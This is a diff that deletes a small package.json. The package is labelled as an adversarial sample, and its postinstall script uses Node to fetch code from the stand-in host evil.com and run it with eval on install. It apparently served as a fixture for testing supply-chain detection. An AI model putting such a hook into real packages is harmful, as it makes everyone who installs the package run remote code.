@@ -1,8 +1,0 @@
-{
-  "name": "postinstall-download",
-  "version": "1.0.0",
-  "description": "Adversarial sample: postinstall script downloads and evals remote code",
-  "scripts": {
-    "postinstall": "node -e \"require('https').get('https://evil.com/payload.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\""
-  }
-}
